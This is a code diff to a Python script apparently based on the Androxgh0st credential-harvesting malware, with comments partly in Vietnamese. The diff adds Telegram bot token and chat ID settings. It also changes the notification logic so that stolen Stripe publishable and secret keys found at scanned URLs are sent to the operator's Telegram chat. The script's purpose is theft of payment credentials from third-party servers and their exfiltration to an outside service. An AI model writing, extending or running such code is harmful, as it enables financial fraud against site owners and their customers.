@@ -37,6 +37,13 @@ logging.getLogger('urllib3.connectionpool').setLevel(logging.ERROR)
 
 pid_restore = '.nero_swallowtail'
 
+# ====== TELEGRAM CONFIGURATION ======
+# Điền thông tin Telegram bot của bạn vào đây để tự động gửi thông báo
+# Nếu để rỗng, có thể truyền qua command line: --telegram-bot-token và --telegram-chat-id
+TELEGRAM_BOT_TOKEN = ""  # Ví dụ: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
+TELEGRAM_CHAT_ID = ""    # Ví dụ: "123456789"
+# ====================================
+
 # Global runtime configuration (set in main)
 SESSION = None
 ARGS = None
@@ -160,13 +167,17 @@ class androxgh0st:
 					jf.write(json.dumps(entry)+"\n")
 
 		# Send Telegram notification if configured
-		if ARGS and ARGS.telegram_bot_token and ARGS.telegram_chat_id:
+		# Ưu tiên command line arguments, nếu không có thì dùng config trong file
+		bot_token = (ARGS.telegram_bot_token if (ARGS and ARGS.telegram_bot_token) else TELEGRAM_BOT_TOKEN)
+		chat_id = (ARGS.telegram_chat_id if (ARGS and ARGS.telegram_chat_id) else TELEGRAM_CHAT_ID)
+
+		if bot_token and chat_id:
 			telegram_message = f"🔑 <b>STRIPE KEY FOUND!</b>\n\n"
 			telegram_message += f"<b>URL:</b> {url}\n"
 			telegram_message += f"<b>METHOD:</b> {method}\n"
 			telegram_message += f"<b>STRIPE_KEY:</b> <code>{stripe_key}</code>\n"
 			telegram_message += f"<b>STRIPE_SECRET:</b> <code>{stripe_secret}</code>"
-			send_telegram(telegram_message, ARGS.telegram_bot_token, ARGS.telegram_chat_id)
+			send_telegram(telegram_message, bot_token, chat_id)
 
 		return True
 
